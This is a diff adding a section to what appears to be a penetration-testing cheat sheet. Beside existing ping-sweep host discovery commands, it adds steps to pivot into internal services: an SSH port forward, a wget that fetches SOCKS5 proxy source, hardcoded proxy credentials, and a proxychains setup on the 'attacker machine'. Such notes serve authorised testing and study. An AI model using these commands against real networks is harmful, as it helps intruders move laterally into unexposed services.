@@ -31,3 +31,24 @@ for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done
 for i in {1..254}; do (ping -c 1 192.168.1.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
 ping6 -c4 -I eth0 ff02::1 | tee ipv6
 ```
+# Port Forwarding if you have found any susceptible Services like Tomcat.Jboss and Weblogic
+```
+ssh -i private.key ubuntu@54.211.12.132 -L 8080:127.0.0.1:8080 -N -f
+
+wget https://raw.githubusercontent.com/mfontanini/Programs-Scripts/master/socks5/socks5.cpp
+
+The following variable should be changed
+define SERVER_PORT 7777
+#define USERNAME "NLK"
+#define PASSWORD "123456@*&<>"
+
+On your Attacker Machine,proxychains setting must be amend like information below
+
+socks5 54.211.12.132 7777 NLK 123456@*&<>
+proxychains firefox 127.0.0.1:8080
+
+
+
+
+
+```
